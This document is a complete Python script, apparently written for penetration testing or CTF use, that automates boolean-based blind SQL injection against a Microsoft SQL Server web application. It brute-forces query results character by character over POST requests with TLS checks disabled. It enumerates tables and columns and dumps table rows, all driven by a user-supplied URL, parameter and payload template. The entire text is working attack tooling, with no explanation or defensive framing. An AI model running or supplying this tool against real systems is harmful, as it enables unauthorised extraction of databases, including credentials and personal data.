import requests
import urllib3
import sys
import argparse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_string(query, max_len=1000):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for char_code in range(32, 127):  # Printable ASCII
            payload = args.payload_template.format(query, pos, char_code)
            r = requests.post(args.url, data={args.param: payload}, verify=False)
            if args.true_string in r.text:  # True condition
                result += chr(char_code)
                #print(f"Position {pos}: {chr(char_code)}")
                found = True
                break
        if not found:
            #print(f"Stopped at position {pos-1} (no more characters)")
            break
    return result

def extract_tables():
    """Extract all table names from the database."""
    tables = []
    exclude_list = ""
    
    while True:
        # Build exclusion list
        if exclude_list:
            query = f"SELECT TOP 1 name FROM sys.tables WHERE name NOT IN ({exclude_list})"
        else:
            query = "SELECT TOP 1 name FROM sys.tables"
        
        # Extract table name
        table_name = extract_string(query, max_len=100)
        
        if not table_name:
            break  # No more tables
        
        tables.append(table_name)
        print(f"Found table: {table_name}")
        
        # Add to exclusion list for next iteration
        if exclude_list:
            exclude_list += f",'{table_name}'"
        else:
            exclude_list = f"'{table_name}'"
    
    return tables

def extract_columns(table_name):
    """Extract all column names from a table."""
    columns = []
    exclude_list = ""
    
    while True:
        if exclude_list:
            query = f"SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}' AND column_name NOT IN ({exclude_list})"
        else:
            query = f"SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='{table_name}'"
        
        col_name = extract_string(query, max_len=100)
        
        if not col_name:
            break
        
        columns.append(col_name)
        print(f"Found column: {col_name}")
        
        if exclude_list:
            exclude_list += f",'{col_name}'"
        else:
            exclude_list = f"'{col_name}'"
    
    return columns

def get_column_type(table_name, column_name):
    """Get the SQL data type of a column."""
    query = f"SELECT DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table_name}' AND COLUMN_NAME='{column_name}'"
    return extract_string(query, max_len=50).strip().lower()

def needs_casting(data_type):
    """Determine if a data type needs CAST to VARCHAR."""
    numeric_types = ['bit', 'int', 'bigint', 'smallint', 'tinyint', 'decimal', 'numeric', 'float', 'real', 'money', 'smallmoney']
    return data_type in numeric_types

def dump_table(table_name, columns, where_clause=None, max_rows=100):
    results = []
    exclude_list = []
    
    # Get count
    count_query = f"SELECT CAST(COUNT(*) AS VARCHAR(10)) FROM {table_name}"
    if where_clause:
        count_query += f" WHERE {where_clause}"
    count_str = extract_string(count_query, max_len=10)
    row_count = int(count_str) if count_str.isdigit() else 0
    print(f"Found {row_count} rows in {table_name}")

    # Cache column types
    column_types = {}
    for col in columns:
        col_type = get_column_type(table_name, col)
        column_types[col] = col_type
        print(f"Column {col}: {col_type}")
    
    # Extract each row
    for row_num in range(1, min(row_count, max_rows) + 1):
        row_data = {}

        # Build exclusion WHERE clause
        conditions = []
        if exclude_list:
            id_list = ",".join(exclude_list)
            conditions.append(f"id NOT IN ({id_list})")
        if where_clause:
            conditions.append(where_clause)
        
        where = ""
        if conditions:
            where = " WHERE " + " AND ".join(conditions)

        # Extract ID first (CAST to string)
        id_query = f"SELECT TOP 1 CAST(id AS VARCHAR) FROM {table_name}{where}"
        #print(f"DEBUG: {id_query}")
        row_id = extract_string(id_query, max_len=10).strip()
        #print(f"DEBUG: Got ID '{row_id}'")
        #print(f"id: {row_id}")
        row_data['id'] = row_id

        if row_id:
            exclude_list.append(row_id)
        
            # Extract other columns
            for col in columns:
                if col == 'id':
                    continue

                # Build query with automatic casting if needed
                col_type = column_types.get(col, 'varchar')
                if needs_casting(col_type):
                    query = f"SELECT CAST({col} AS VARCHAR) FROM {table_name} WHERE id={row_id}"
                else:
                    query = f"SELECT {col} FROM {table_name} WHERE id={row_id}"

                value = extract_string(query, max_len=200).strip()
                #print(f"{col}: {value}")
                row_data[col] = value
            
            results.append(row_data)
            print(f"Row {row_num}: {row_data}")
        else:
            print(f"Row {row_num}: No ID found, stopping")
            break
    
    return results

parser = argparse.ArgumentParser()
parser.add_argument("--enum-tables", dest="enum_tables", action="store_true", help="Extract table names")
parser.add_argument("--enum-columns", dest="enum_columns", action="store_true", help="Extract column names from specified table")
parser.add_argument("-q", dest="query", help="Query to extract")
parser.add_argument("-t", dest="table", help="Specify table")
parser.add_argument("-c", dest="columns", required=False,
                        type=lambda s: [x.strip().lower() for x in s.split(',')],
                        help=f"Specify comma-separated column names")
parser.add_argument("--dump-table", dest="dump_table", action="store_true", help="Dump table content (needs -t and -c)")
parser.add_argument("-u", dest="url", required=True, help="Specify url")
parser.add_argument("-pt", dest="payload_template", required=True, help="Specify payload template")
parser.add_argument("-p", dest="param", required=True, help="Specify parameter name for the request")
parser.add_argument("--true-string", dest="true_string", required=True, 
                    help="The program determines if a response is 'true' checking if this arg is present in the server response")

args = parser.parse_args()


# Extract query
if args.query:
    print(f"{args.query}:", extract_string(args.query))

if args.enum_tables:
    tables = extract_tables()
    print(f"\nAll tables: {tables}")

if args.enum_columns and args.table:
    columns = extract_columns(args.table)
    print(f"\nColumns for table {args.table}: {columns}")

if args.dump_table and args.table and args.columns:
    dump_table(args.table, args.columns)
